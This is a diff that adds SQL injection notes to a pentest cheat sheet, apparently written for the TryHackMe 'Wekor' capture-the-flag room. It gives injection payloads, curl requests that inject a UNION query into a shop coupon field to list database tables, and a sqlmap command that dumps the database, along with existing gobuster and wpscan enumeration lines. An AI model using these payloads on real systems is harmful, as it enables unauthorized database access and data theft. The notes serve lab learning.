@@ -22,3 +22,29 @@ gobuster dir -e -u http://site.${URL} -xphp,txt -t30 -w ${WORDLISTS}
 wpscan.api=$(cat ~/Downloads/wpscan.api)
 wpscan --url http://site.${URL}/wordpress/ -e ap,u --api-token ${wpscan.api}
 ```
+### How to bruteforce sql with sqlmap
+Test if vulnerable to sqli
+```bash
+' or 1 = 1 -- -
+```
+Pull 
+```bash
+' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables -- -
+```
+```bash
+curl -X POST http://${URL}/it-next/it_cart.php \
+  -d "coupon_code=' OR 1=1 -- -" \
+  -d "apply_coupon=Apply Coupon" | grep -i code
+
+curl -X POST http://${URL}/it-next/it_cart.php \
+  -d "coupon_code=' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables -- -" \ -d "apply_coupon=Apply Coupon" | grep -i code
+```
+SQLMAP
+```bash
+sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --dump
+```
+## Resource
+https://erichogue.ca/2021/06/Wekor
+
+https://github.com/kartikeyj96/Tryhackme-Writeups/blob/main/Wekor%20Writeup
+```
